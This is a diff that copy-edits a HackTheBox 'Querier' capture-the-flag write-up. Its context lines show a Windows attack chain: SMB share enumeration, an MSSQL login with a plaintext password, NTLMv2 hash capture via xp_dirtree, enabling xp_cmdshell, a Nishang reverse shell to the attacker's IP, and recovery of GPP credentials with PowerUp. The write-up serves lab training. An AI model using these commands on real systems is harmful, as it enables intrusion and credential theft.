@@ -5,7 +5,7 @@
 :tags: security, htb, pwn, web, windows
 :image: cover.png
 :alt: New York City Skyline
-:description: Querier is a Windows HackTheBox machine with several insecure configurations. This article explain how to use this configurations to gain system access like user without privileges and how to escalate to administrator privileges using some penetration testing tools.
+:description: Querier is a Windows HackTheBox machine with several insecure configurations. This article explains how to use these configurations to gain system access as a user without privileges, and how to escalate to administrator privileges using penetration testing tools.
 :keywords: HTB, Security, Web, Writeup, Bounty, Windows
 :author: Andrés Tirado
 :writer: atirado
@@ -18,27 +18,26 @@
 In my opinion,
 link:https://www.hackthebox.eu/home/machines/profile/175[Querier]
 is a great box.
-We can learn a bit about +Windows+ pentesting,
-a widely used operating system.
-The challenge begins with a public +SMB+
-where we will pass our first level.
-Next we will work with +SQL Server+
-and we will need to use
-a special +SQL+ query to get the user hash.
-In the end we will take advantage
-an insecure configuration
-in +Group Policy Preferences+ of +Windows+
+By following the steps below
+we will learn a bit about +Windows+
+(a widely used operating system) pentesting.
+The challenge begins with a public +SMB+;
+this is our first challenge level.
+Next, we will work with +SQL Server+
+and we will need to use a special +SQL+ query
+to get the user hash.
+Finally, we will take advantage of an insecure configuration
+in +Group Policy Preferences+ in +Windows+
 to escalate to administrator privileges.
-Now we will see this step by step.
 
 
 == Scanning Phase
 
 The first thing to do is check the connection
-to the machine with a simple +ping+.
+to the machine with a simple +ping+ command.
 We need a stable connection
 with the box to make sure that
-we won't lose our progress.
+we will not lose our progress.
 
 .Ping
 [source, bash]
@@ -52,8 +51,8 @@ image::ip.png[ip]
 .Doing ping
 image::ping.png[ping]
 
-Next we can use +nmap+ to find open ports in the machine,
-a simple port scanning is enough for our purposes.
+Next, we can use +nmap+ to find open ports in the machine.
+A simple port scanning is enough for our purposes.
 
 [source, bash]
 ----
@@ -64,22 +63,20 @@ $ nmap -Pn 10.10.10.125
 image::nmap.png[nmap]
 
 We see 4 open ports (+135+, +139+, +445+ and +1433+)
-and among these
+and among these,
 we found two interesting services,
 +microsoft-ds (SMB)+ in port +445+ and
 +ms-sql-s+ in port +1433+.
-We try to access via SMB and
+When we try to access via SMB,
 it shows us a shared folder called `Report` with a `.xlsm` file,
-the extension of +Microsoft Excel Document+.
+the extension indicating a +Microsoft Excel Document+.
 
 .Public share
 image::share.png[share]
 
-Then we open the file with +Microsoft Excel+ and
+Then we open the specified file with +Microsoft Excel+ and
 a warning message appears telling us that
-the file contains a suspicious macro,
-this is a little hint to next step,
-we will check that.
+the file contains a suspicious macro.
 
 .Macro alert
 image::alert.png[alert]
@@ -95,7 +92,7 @@ that we should never do.
 .Macro code
 image::macro.png[macro]
 
-== Getting user
+== Getting User
 
 Now we can connect to the other interesting service
 that we found: +ms-sql-s+.
@@ -113,15 +110,15 @@ $ mssqlclient.py -windows-auth QUERIER/reporting:PcwTWTHRwryjc\$c6@10.10.10.125
 .Mssql conection
 image::mssql-conection.png[mssql-conection]
 
-We will use this service to gain system access
-like user without privileges.
-We mount a +SMB+ server in our machine
+We will use this service to gain system access,
+for example as a user without privileges.
+We mount an +SMB+ server in our machine
 to capture the authentication of any Windows user,
-in this case the user that executes the service +ms-sql-s+.
-We should tell it to enter to our share
+in this case, the user that executes the service +ms-sql-s+.
+We tell it to enter our share
 to capture its +NTLMv2+ hash with an +xp_dirtree+ query.
 This stored procedure of +SQL Server+
-will visit our +SMB+ share
+will access our +SMB+ share
 to display a list of every folder,
 every subfolder, and every file.
 
@@ -156,11 +153,11 @@ $ john.exe --wordlist=rockyou.txt --format-netntlmv2 \\
 .Runnnig John
 image::john.png[john]
 
-Now we can connect to +SQL Server+ as user +mssql-svc+,
-we try to execute command +whoami+ but
-it response telling us that
-component +xp_cmdshell+ is blocked but
-since we are the administrator of the service,
+Now we can connect to +SQL Server+ as user +mssql-svc+.
+We try to execute the command +whoami+, however,
+it responds telling us that
+component +xp_cmdshell+ is blocked.
+Since we are the service administrator,
 we can enable it using a few queries.
 
 [source, bash]
@@ -183,21 +180,21 @@ image::user-mssql.png[user-mssql]
 .xp_cmdshell enabled
 image::mssql-commands.png[mssql-commands]
 
-As we can execute commands
-the reading of the user flag is now possible.
+Because we can execute commands,
+reading the user flag is now possible.
 
 .User flag
 image::flag-user.png[flag-user]
 
-== Getting root
+== Getting Root
 
-This method to execute commands
-may be inconvenient to escalate privileges,
-then we will be upload a shell to server.
-We will use the script +Invoke-PowerShellTcp.ps1+
+This method of executing commands
+may be an inconvenient way to escalate privileges,
+so we will upload a shell to the server.
+To do this we will use the script +Invoke-PowerShellTcp.ps1+
 of +Nishang+ framework.
-Before to upload the shell
-we add our IP and
+Before uploading the shell
+we add our IP address and
 some free port to make the connection.
 
 [source, bash]
@@ -208,7 +205,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.1 -Port 30000
 .Invoke-PowerShellTcp code
 image::ip-shell.png[ip-shell]
 
-Then is necessary start an +HTTP server in our machine.
+Then it is necessary to start an +HTTP server in our machine.
 We can do it with +Python3+.
 
 [source, bash]
@@ -249,9 +246,9 @@ image::shell-nc.png[shell-nc]
 
 At this point we use the module +PowerUp.ps1+
 from the +PowerSploit+ collection to scan the system
-to find the way to escalate privileges.
+to find a way to escalate privileges.
 We can use the same method as in the last step.
-We upload the file to server with +Python3+.
+We upload the file to the server with +Python3+.
 
 To execute the script we need to import it first,
 next we can run all checks
@@ -271,9 +268,9 @@ image::powerup.png[powerup]
 We can see the Administrator credentials
 in plain text in the script output.
 The script took advantage
-an insecure configuration
-in +Group Policy Preferences+ of +Windows+,
-it saves credentials with a weak encryption.
+of an insecure configuration
+in +Group Policy Preferences+ of +Windows+;
+it saves credentials with weak encryptions.
 It’s time to prove these and
 to obtain the root flag.
 
@@ -282,7 +279,7 @@ image::root-credentials.png[root-credentials]
 
 Finally, we can get an interactive shell
 as Administrator with +psxec.py+ from +Impacket+.
-With this we can read the root flag.
+With this, we can read the root flag.
 
 [source, bash]
 ----
@@ -306,10 +303,10 @@ image::crypt.png[crypt]
 image::decrypt.png[decrypt]
 
 In this challenge,
-we see some insecure configurations
-like saved credentials in plain text in code.
+we saw some insecure configurations
+such as saved credentials in plain text in code.
 We also learned how to start an +SMB+ server
 in our machine to capture hashes and
-finally we learned and used some important tools
+finally, we learned and used some important tools
 for pentesting in +Windows+ like
-+Impacket+, +Nishang+ and +PowerSploit+.
++Impacket+, +Nishang+, and +PowerSploit+.
